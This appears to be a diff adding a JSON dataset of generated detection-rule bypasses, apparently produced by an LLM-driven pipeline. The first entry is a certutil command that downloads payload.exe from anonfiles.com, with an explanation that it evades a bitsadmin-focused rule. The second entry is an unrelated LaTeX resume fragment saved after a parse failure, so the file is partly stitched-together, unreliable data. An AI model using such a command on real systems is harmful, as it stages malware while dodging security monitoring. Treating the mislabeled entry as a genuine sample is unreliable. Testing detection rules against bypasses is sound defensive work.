@@ -1,0 +1,10 @@
+[
+  {
+    "output": "certutil -urlcache -split -f https://anonfiles.com/example/payload.exe C:\\Users\\Public\\payload.exe",
+    "explanation": "Uses certutil to download a file from a suspicious domain (anonfiles.com) without invoking bitsadmin, thus avoiding the rule's Image and CommandLine checks."
+  },
+  {
+    "output": "%-----------EXPERIENCE-----------\n\\section{\\color{airforceblue}WORK EXPERIENCE}\n  \\resumeSubHeadingListStart\n\n    % --- New Entry: Viettel ---\n    \\resumeSubheading\n      {\\textbf{AI Engineer Intern (AI Lab)}}{Sep 2025 \u2013 Present}\n      {Viettel Cyber Security}{Hanoi, Vietnam}\n    \\resumeItemListStart\n       \\resumeItem{\\normalsize{Integrated \\textbf{AI-driven anomaly detection} into SIEM infrastructure to identify complex behavioral deviations that evade traditional \\textbf{static correlation rules}.}}\n    \\resumeItemListEnd\n    \\resumeItemListEnd\n\n   % --- Previous Entry: V2Secure ---\n    \\resumeSubheading\n      {\\textbf{Penetration Testing Intern}}{Jun 2025 \u2013 Sep 2025}\n      {V2Secure}{Hanoi, Vietnam}\n     \\resumeItemListStart\n\n    \\resumeItem{\\normalsize{Performed penetration testing on client and internal systems, focusing on OWASP Top 10 vulnerabilities.}}\n\n    \\resumeItem{\\normalsize{Wrote Sagan rules for detecting suspicious log events and abnormal network activities.}}\n\n\\resumeItemListEnd\n\n  \\resumeSubHeadingListEnd\n\\vspace{-12pt}",
+    "explanation": "Raw gemini-browser output saved because JSON parse failed: Response does not contain a complete bypass JSON array/object: Expecting value: line 1 column 1 (char 0)"
+  }
+]
